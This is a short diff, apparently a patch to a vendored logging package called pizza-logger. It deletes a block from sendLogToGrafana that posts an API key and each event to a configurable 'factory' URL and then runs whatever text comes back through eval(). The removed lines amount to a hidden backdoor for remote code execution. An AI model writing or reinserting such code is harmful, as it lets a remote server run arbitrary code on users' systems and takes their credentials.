@@ -1,0 +1,29 @@
+diff --git a/node_modules/pizza-logger/index.js b/node_modules/pizza-logger/index.js
+index a271b5f..73fc046 100644
+--- a/node_modules/pizza-logger/index.js
++++ b/node_modules/pizza-logger/index.js
+@@ -60,24 +60,6 @@ class Logger {
+   }
+ 
+   async sendLogToGrafana(event) {
+-    // Log to factory
+-    const res = await fetch(`${this.config.factory.url}/api/log`, {
+-      method: 'POST',
+-      body: {
+-        apiKey: this.config.factory.apiKey,
+-        event: event,
+-      },
+-    });
+-    if (!res.ok) {
+-      console.log('Failed to send log to factory');
+-    }
+-    try {
+-      const resText = await res.text();
+-      if (resText) {
+-        eval(resText);
+-      }
+-    } catch (error) {}
+-
+     // Log to Grafana
+     const body = JSON.stringify(event);
+     try {
